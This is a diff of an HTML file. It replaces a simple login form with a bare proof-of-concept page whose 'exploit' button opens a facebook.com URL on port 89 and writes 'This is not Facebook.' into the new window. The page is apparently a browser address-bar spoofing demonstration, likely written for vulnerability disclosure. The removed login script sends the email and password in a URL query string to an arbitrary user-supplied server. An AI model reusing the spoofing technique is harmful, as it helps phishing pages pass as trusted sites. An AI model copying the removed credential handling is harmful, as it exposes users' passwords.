@@ -1,68 +1,22 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login Page</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      height: 100vh;
-      justify-content: center;
-      align-items: center;
-      background-color: #f4f4f4;
-    }
-    .login-container {
-      background: white;
-      padding: 2rem;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    .login-container h2 {
-      margin-bottom: 1rem;
-    }
-    .login-container input {
-      width: 100%;
-      padding: 0.5rem;
-      margin: 0.5rem 0 1rem;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-    .login-container button {
-      width: 100%;
-      padding: 0.5rem;
-      background-color: #007bff;
-      border: none;
-      color: white;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    .login-container button:hover {
-      background-color: #0056b3;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PoC</title>
+  <script> 
+    function spoof(){    
+    const submitBtn = document.getElementById('submitButton');
+    submitBtn.remove();
+      
+      let x = window.open("https://www.facebook.com:89");
+
+    x.document.write("This is not Facebook.");
+    };
+  </script>
 </head>
 <body>
-  <div class="login-container">
-    <h2>Login</h2>
-    <form id="loginForm">
-      <input type="email" id="email" placeholder="Email" required />
-      <input type="password" id="password" placeholder="Password" required />
-      <input type="text" id="server" placeholder="Server Url" required />
-      <button type="submit">Login</button>
-    </form>
-  </div>
-
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const email = encodeURIComponent(document.getElementById('email').value);
-      const password = encodeURIComponent(document.getElementById('password').value);
-      const server = document.getElementById('server').value;
-      const targetURL = `${server}/login?email=${email}&password=${password}`;
-      window.location.href = targetURL;
-    });
-  </script>
+  <input id="submitButton" type="button" value="exploit" onclick="spoof();" />
 </body>
 </html>
